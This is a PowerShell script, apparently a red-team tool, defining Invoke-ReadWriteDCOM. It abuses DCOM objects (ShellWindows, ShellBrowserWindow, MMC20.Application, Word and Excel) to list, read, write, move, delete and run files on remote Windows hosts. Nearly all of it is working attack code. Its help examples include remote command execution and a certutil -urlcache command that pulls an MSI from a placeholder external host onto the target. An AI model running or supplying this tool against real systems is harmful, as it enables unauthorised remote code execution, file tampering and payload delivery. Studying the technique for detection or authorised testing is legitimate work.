<#

    DCOM Read Write 
    Author: https://github.com/Hagrid29

#>


function Invoke-ReadWriteDCOM {
<#
    .SYNOPSIS

       Perform drectory listing, read and write file on remote computer via DCOM methods

    .DESCRIPTION

		Read/write remote files via Word/Excel COM object, and list remote directory via ShellWindows COM object

    .PARAMETER ComputerName

        IP Address or Hostname of the remote system

    .PARAMETER Action

		Specifies the desired action 
		- List:		list a directory or a file
		- Copy:		Copy file to specific location
		- Move:		Move file to specific location
		- Delete:	Delete a file
		- Read:		Read a text file
		- Write:	Write a text file
		- Exec:		Execute specific program

    .PARAMETER TargetPath

		Specifies the desired file path or folder path for Action

	.PARAMETER ToFolder

		Required for Action "Copy"/"Move"
		
	.PARAMETER Text

		Supply for Action "Write"
	
	.PARAMETER LocalFile
	
		Supply for Action "Write"
	
	.PARAMETER AppendFileEnd
	
		Switch for Action "Write": append content to target file
	
	.PARAMETER Method
		
		Specifies the desired type of execution for Action "Exec". Default execute C:\Windows\System32\cmd.exe
	
	.PARAMETER Args
		
		Optional, supply arguments to the program for Action "Exec"

    .EXAMPLE
		
		List a directory on target computer
		Invoke-ReadWriteDCOM -Action List -ComputerName 127.0.0.1 -TargetPath C:\Temp
		
	.EXAMPLE
		
		Copy a file on target computer to desired location
		Invoke-ReadWriteDCOM -Action Copy -ComputerName 127.0.0.1 -TargetPath C:\Windows\comsetup.log -ToFolder C:\temp
		
	.EXAMPLE
		
		Delete a file on target computer i.e, move a file to recycle bin
		Invoke-ReadWriteDCOM -Action Delete -ComputerName 127.0.0.1 -TargetPath C:\Temp\comsetup.log
		
	.EXAMPLE
		
		Read a text file on target computer 
		Invoke-ReadWriteDCOM -Action Read -ComputerName 127.0.0.1 -TargetPath C:\Temp\comsetup.log
		
	.EXAMPLE
		
		Write a text file on target computer 
		Invoke-ReadWriteDCOM -Action Write -ComputerName 127.0.0.1 -TargetPath C:\Temp\run.bat -Text "cmd.exe /c calc"
		Append a text file on target computer from a local text file
		Invoke-ReadWriteDCOM -Action Write -ComputerName 127.0.0.1 -TargetPath C:\Temp\target.txt -LocalFile C:\Users\Public\myfile.txt -AppendFileEnd
		
	.EXAMPLE
		
		Execute command with cmd.exe on target computer 
		Invoke-ReadWriteDCOM -Action Exec -Method ShellBrowserWindow -ComputerName 127.0.0.1 -Args "/c calc"
		Execute a program on target computer 
		Invoke-ReadWriteDCOM -Action Exec -Method ShellBrowserWindow -ComputerName 127.0.0.1 -TargetPath C:\Windows\System32\certutil.exe -Args "-urlcache -f `"https://X.X.X.X/in.msi`" C:\temp\in.msi"
		
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
        [String]
        $ComputerName,

        [Parameter(Mandatory = $true, Position = 1)]
        [ValidateSet("List", "Read", "Write", "Move", "Copy", "Delete", "Exec")]
        [String]
        $Action,

        [Parameter(Mandatory = $false, Position = 2)]
        [string]
        $TargetPath,
		
		[Parameter(Mandatory = $false, Position = 3)]
        [string]
        $ToFolder,

		[Parameter(Mandatory = $false, Position = 4)]
        [string]
        $Text,
		
		[Parameter(Mandatory = $false, Position = 5)]
        [string]
        $LocalFile,

		[Parameter(Mandatory = $false, Position = 6)]
        [switch]
        $AppendFileEnd,
		
		[Parameter(Mandatory = $false, Position = 7)]
		[ValidateSet("ShellWindows", "ShellBrowserWindow", "MMC20.Application")]
        [string]
        $Method,
		
		[Parameter(Mandatory = $false, Position = 8)]
        [string]
        $Args

    )

	
	
	$Com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","$ComputerName")
	$Obj = [Activator]::CreateInstance($Com)
	$PathObj = $Obj.Item().Document.Folder.ParseName("$TargetPath")
	if($PathObj -eq $null){
		$isTargetPathExist = $false
	}else{
		$isTargetPathExist = $true
	}
	
	$isAppend = $false
	if($PSBoundParameters.ContainsKey('AppendFileEnd')){
		$isAppend = $true
	}
	


   if ( ($Action -Match "List") -or ($Action -Match "Copy") -or ($Action -Match "Move") -or ($Action -Match "Delete") ) {
		if(-Not $isTargetPathExist){
			Write-Error "Cannot find path '$TargetPath' because it does not exist."
			return
		}
		$Com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","$ComputerName")
	}
	elseif ( $Action -Match "Read") {
	
		if(-Not $isTargetPathExist){
			Write-Error "Cannot find the file $TargetPath specified on $ComputerName."
			return
		}
		$Com = [Type]::GetTypeFromProgID("Word.Application","$ComputerName")
	}
	elseif ( $Action -Match "Write" ) {

		$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
	}
	elseif ( $Action -Match "Exec" ) {
	
		if(-Not $isTargetPathExist){
			Write-Error "$TargetPath is not recognized as an operable program or batch file."
			return
		}
		if($Method -Match "ShellWindows"){
			$Com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","$ComputerName")
		}
		elseif($Method -Match "ShellBrowserWindow"){
			$Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
		}
		elseif($Method -Match "MMC20.Application"){
			$Com = [Type]::GetTypeFromProgID("MMC20.Application","$ComputerName")
		}
	}
	
	$Obj = [Activator]::CreateInstance($Com)
	


	
	if ($Action -Match "list") {
		
		$PathObj = $Obj.Item().Document.Folder.ParseName("$TargetPath")
	
		if($PathObj.IsFolder){
			$Path = $PathObj.Path
			$Content = $PathObj.GetFolder.items()
		}
		else{
			$Path = $PathObj.Parent.Self.Path
			$Content = $PathObj
		}
		Write-Output "" 
		Write-Output "    Directory: $Path" 
		$Content | select IsFolder,ModifyDate,Size,Name | Sort-Object -Property IsFolder,ModifyDate -Descending | Format-Table -AutoSize -GroupBy IsFolder ModifyDate,Size,Name
	
	
	}
	elseif ($Action -Match "Copy") {
		
		$PathObj = $Obj.Item().Document.Folder.ParseName("$ToFolder")
		$PathObj.GetFolder.CopyHere("$TargetPath")
		Write-Host "        file copyed."
		Write-Host ""
	}
	elseif ($Action -Match "Move") {
		
		$PathObj = $Obj.Item().Document.Folder.ParseName("$ToFolder")
		$PathObj.GetFolder.MoveHere("$TargetPath")
		Write-Host "        file moved."
		Write-Host ""
	}
	elseif ($Action -Match "Delete") {
		
		#move to recycal bin of the user
		$PathObj = $Obj.Item().Document.Folder.ParseName("$TargetPath")
		$PathObj.InvokeVerb("Delete")
	}
	elseif ($Action -Match "Read") {
		
		#cannot read hidden file e.g., .gitconfig
		$Document = $Obj.Documents.Open("$TargetPath")
		foreach($p in $Document.Paragraphs){$p.range.text}
		$Obj.Quit()
	}
	elseif ($Action -Match "Write") {
		
		if(-Not $isTargetPathExist){
			$sh = $Obj.Workbooks.Add()
			if($Text -ne ""){
				$sh.ActiveSheet.cells(1, 1).Value = $Text
			}
			elseif($LocalFile -ne ""){
				$i = 1
				foreach($line in Get-Content "$LocalFile"){
					$sh.ActiveSheet.cells($i, 1).Value = $line
					$i++
				}	
			}
			else{
				$Obj.quit()
				Write-Error "-Text or -LocalFile prarmeter is required"
				return
			}
			$sh.saveas("$TargetPath", 6)
			Write-Output "File $TargetPath created and saved"
		}
		else{
			$sh = $Obj.Workbooks.open("$TargetPath")
			if($isAppend){
				$begin_row = $sh.ActiveSheet.UsedRange.Rows.Count + 1
				if($Text -ne ""){
					$sh.ActiveSheet.cells($begin_row, 1).Value = $Text
				}
				elseif($LocalFile -ne ""){
					$i = $begin_row
					foreach($line in Get-Content "$LocalFile"){
						$sh.ActiveSheet.cells($i, 1).Value = $line
						$i++
					}	
				}
				else{
					$Obj.quit()
					Write-Error "-Text or -LocalFile prarmeter is required"
					return
				}
				$sh.save()
				Write-Output "File $TargetPath edited and saved"
			}
			else{
				$Obj.quit()
				Write-Error "Target file $TargetPath exist on $ComputerName. -AppendFileEnd switch is required to append content"
				return
			}
		}
		
		$Obj.quit()
	}
	
	elseif ($Action -Match "Exec") {
		
		if($TargetPath -eq ""){
			$TargetPath = "C:\Windows\System32\cmd.exe"
		}
		
		if($Method -Match "ShellWindows"){
			#a blank prompt will be popped up
			$Obj.Item().Document.Folder.ParseName("$TargetPath").InvokeVerbEx("open", $Args)
		}
		elseif($Method -Match "ShellBrowserWindow"){
			$Obj.Document.Application.ShellExecute("$TargetPath",$Args,"",$null,0)
		}
		elseif($Method -Match "MMC20.Application"){
			#a blank prompt will be popped up
			$Obj.Document.ActiveView.ExecuteShellCommand("$TargetPath",$null,$Args,"7")
		}
	}
	
		
		
}




